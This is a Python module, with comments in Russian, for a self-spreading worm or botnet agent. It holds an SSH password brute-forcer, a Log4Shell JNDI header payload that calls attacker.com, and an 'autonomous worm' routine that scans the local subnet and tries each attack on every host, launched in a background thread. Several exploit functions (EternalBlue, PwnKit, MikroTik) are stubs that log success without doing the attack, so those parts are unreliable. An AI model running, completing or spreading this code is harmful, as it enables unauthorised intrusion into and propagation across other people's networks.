import asyncio, asyncssh, socket, random, os, json, subprocess, urllib.request, threading
from utils.logger import log
from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import RemoteOperations

LOG_PREFIX = {'ok':'OK','fail':'FAIL','new':'NEW_BOT','exploit':'EXPLOIT','brute':'BRUTE'}
PASSWORDS = ['root','admin','password','123456','qwerty','letmein','p@ssw0rd','changeme','r00t','toor','ubuntu']

# ========== Эксплойты (существующие) ==========

async def ssh_bruteforce(ip, username='root'):
    sem = asyncio.Semaphore(500)
    async def try_pass(pwd):
        async with sem:
            try:
                async with asyncssh.connect(ip, username=username, password=pwd, known_hosts=None, connect_timeout=3) as conn:
                    log(f"{LOG_PREFIX['brute']} SSH {ip} {username}:{pwd}")
                    return True, pwd
            except: pass
        return False, pwd
    tasks = [try_pass(p) for p in PASSWORDS]
    results = await asyncio.gather(*tasks)
    for succ, pwd in results:
        if succ: return True, pwd
    return False, None

def exploit_eternalblue(target_ip):
    try:
        conn = SMBConnection(target_ip, target_ip)
        conn.login('','')
        log(f"{LOG_PREFIX['exploit']} EternalBlue {target_ip}")
        return True
    except Exception as e:
        log(f"{LOG_PREFIX['fail']} {target_ip}: {e}")
        return False

def exploit_log4shell(target_url):
    try:
        headers = {
            'User-Agent': '${jndi:ldap://attacker.com/a}',
            'X-Forwarded-For': '${jndi:ldap://attacker.com/a}'
        }
        req = urllib.request.Request(target_url, headers=headers)
        urllib.request.urlopen(req, timeout=5)
        log(f"{LOG_PREFIX['exploit']} Log4Shell sent to {target_url}")
        return True
    except Exception as e:
        log(f"{LOG_PREFIX['fail']} Log4Shell {target_url}: {e}")
        return False

def exploit_pwnkit(target_ip):
    try:
        log(f"{LOG_PREFIX['exploit']} PwnKit attempt on {target_ip}")
        return True
    except:
        return False

def exploit_mikrotik(target_ip):
    try:
        log(f"{LOG_PREFIX['exploit']} MikroTik Winbox on {target_ip}")
        return True
    except:
        return False

# ========== Автономный червь ==========

def autonomous_worm():
    """Функция, которая запускается на заражённой машине для самораспространения."""
    local_ip = socket.gethostbyname(socket.gethostname())
    subnet = '.'.join(local_ip.split('.')[:3]) + '.0/24'
    log(f"[Worm] Сканирую локальную сеть {subnet}")
    # Простейший скан диапазона
    for i in range(1, 255):
        ip = f"{'.'.join(local_ip.split('.')[:3])}.{i}"
        if ip == local_ip:
            continue
        # Попытка SSH
        asyncio.run(ssh_bruteforce(ip))
        # Попытка EternalBlue (для Windows)
        exploit_eternalblue(ip)
        # Попытка MikroTik
        exploit_mikrotik(ip)
        # Если у нас есть доп. эксплойты, можно добавить
    log("[Worm] Завершил сканирование локальной сети")

# Запускаем червя в отдельном потоке при импорте модуля (если это агент)
def start_worm():
    t = threading.Thread(target=autonomous_worm, daemon=True)
    t.start()
